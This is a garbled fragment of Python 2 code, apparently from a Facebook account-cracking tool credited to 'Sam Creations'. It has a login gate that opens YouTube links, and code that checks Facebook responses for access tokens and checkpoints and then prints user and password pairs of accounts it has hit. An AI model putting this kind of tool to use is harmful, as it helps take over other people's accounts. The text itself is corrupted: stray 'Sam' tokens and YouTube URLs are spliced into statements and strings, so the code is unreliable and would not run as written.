...
print "\033[1;96m ============================================================="
print  """\033[1;91m=======================================
\033[1;96mAuthor  \033[1;93m: \033[1;92mSam Creations
...
loop = 'true'
while (loop == 'true'):
    username =Sam raw_input("\033[1;96m[☆] \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password =Sam raw_input("\033[1;96m[☆] \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password ==Sam CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'https://youtu.be/Wvfnr9Zi8Bs
        else:
            print "Wrong Password"https://youtu.be/Wvfnr9Zi8Bs
            os.system(  https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
    else:
        print "Wrong Username"https://youtu.be/Wvfnr9Zi8Bs
        os.system('xdg-open hhttps://youtu.be/Wvfnr9Zi8Bs
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q["error_msg"]:
					printhttps://youtu.be/Wvfnr9Zi8Bs '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
